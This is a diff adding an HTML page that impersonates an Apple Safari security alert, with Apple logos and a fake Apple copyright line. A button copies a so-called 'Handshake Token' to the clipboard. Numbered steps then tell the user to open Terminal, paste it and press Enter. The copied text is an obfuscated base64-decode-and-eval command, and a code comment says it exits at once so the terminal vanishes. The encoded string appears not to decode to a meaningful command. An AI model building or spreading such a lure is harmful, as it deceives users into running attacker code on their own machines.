@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Safari Security Update</title>
+    <style>
+        :root { --mac-blue: #007AFF; --mac-border: rgba(255,255,255,0.15); }
+        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: #1a1a1a; font-family: -apple-system, "SF Pro Text", sans-serif; color: white; -webkit-font-smoothing: antialiased; }
+        
+        /* macOS Glass Modal */
+        .window { width: 400px; background: rgba(45, 45, 45, 0.85); backdrop-filter: blur(40px); border: 0.5px solid var(--mac-border); border-radius: 14px; box-shadow: 0 40px 100px rgba(0,0,0,0.7); padding: 30px; text-align: center; }
+        
+        /* Official Apple Support Logo Container */
+        .app-icon { width: 90px; height: 90px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; }
+        .app-icon img { width: 100%; height: auto; display: block; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3)); }
+
+        h2 { font-size: 18px; font-weight: 600; margin: 0 0 10px 0; letter-spacing: -0.2px; }
+        p { font-size: 13px; color: #D1D1D1; line-height: 1.45; margin: 0 0 24px 0; padding: 0 10px; }
+        
+        .btn-primary { background: var(--mac-blue); color: white; border: none; padding: 11px 0; width: 100%; border-radius: 8px; font-weight: 600; font-size: 13px; cursor: pointer; transition: background 0.2s; }
+        .btn-primary:active { background: #005ecb; }
+
+        /* The "Instruction" Box */
+        .guide-box { display: none; text-align: left; margin-top: 24px; background: rgba(0,0,0,0.25); padding: 18px; border-radius: 10px; border: 0.5px solid var(--mac-border); }
+        .guide-header { color: #FFD60A; font-size: 10px; text-transform: uppercase; letter-spacing: 0.8px; font-weight: 700; margin-bottom: 14px; display: block; }
+        
+        .step { font-size: 12.5px; margin-bottom: 12px; display: flex; align-items: flex-start; line-height: 1.4; color: #eee; }
+        .step:last-child { margin-bottom: 0; }
+        .step-num { color: var(--mac-blue); font-weight: 800; min-width: 22px; display: inline-block; }
+        
+        kbd { background: #4a4a4c; padding: 2px 5px; border-radius: 4px; font-family: inherit; font-size: 10.5px; border: 1px solid #666; box-shadow: 0 1px 0 rgba(0,0,0,0.5); }
+        
+        .footer-note { font-size: 10px; color: #777; margin-top: 15px; border-top: 0.5px solid rgba(255,255,255,0.1); padding-top: 12px; }
+    </style>
+    <link rel="icon" type="image/png" href="https://support.apple.com/favicon.ico">
+</head>
+<body>
+
+<div class="window">
+    <div class="app-icon">
+        <img src="https://support.apple.com/content/dam/edam/applecare/images/en_US/psp/psp_heroes/mini-hero-safari.png" alt="Apple Support Safari">
+    </div>
+    <h2>Critical Safari Service Error</h2>
+    <p>A background integrity violation has locked your current session. To restore your browser's trusted state, apply the <b>Security Handshake</b>.</p>
+    
+    <button class="btn-primary" id="copyBtn">1. Generate Handshake Token</button>
+
+    <div id="guide" class="guide-box">
+        <span class="guide-header">2. Apply Token</span>
+        <div class="step">
+            <span class="step-num">1.</span> 
+            <div>Press <kbd>⌘</kbd> + <kbd>Space</kbd> and type <b>Terminal</b></div>
+        </div>
+        <div class="step">
+            <span class="step-num">2.</span> 
+            <div>Paste (<kbd>⌘</kbd> + <kbd>V</kbd>) and press <b>Enter</b></div>
+        </div>
+        <div class="footer-note">Copyright © 2026 Apple Inc. All rights reserved.</div>
+    </div>
+</div>
+
+<script>
+    // The payload ends with 'exit' to vanish the terminal immediately upon execution
+    const payload = "export B=$(echo 'liquidsky' | base64 --decode); eval $B && exit";
+;
+
+    document.getElementById('copyBtn').addEventListener('click', async () => {
+        try {
+            await navigator.clipboard.writeText(payload);
+            document.getElementById('copyBtn').innerText = "✓ Token Copied";
+            document.getElementById('copyBtn').style.background = "#28a745";
+            document.getElementById('guide').style.display = "block";
+        } catch (e) {
+            console.error("Clipboard failed");
+        }
+    });
+</script>
+
+</body>
+</html>
+
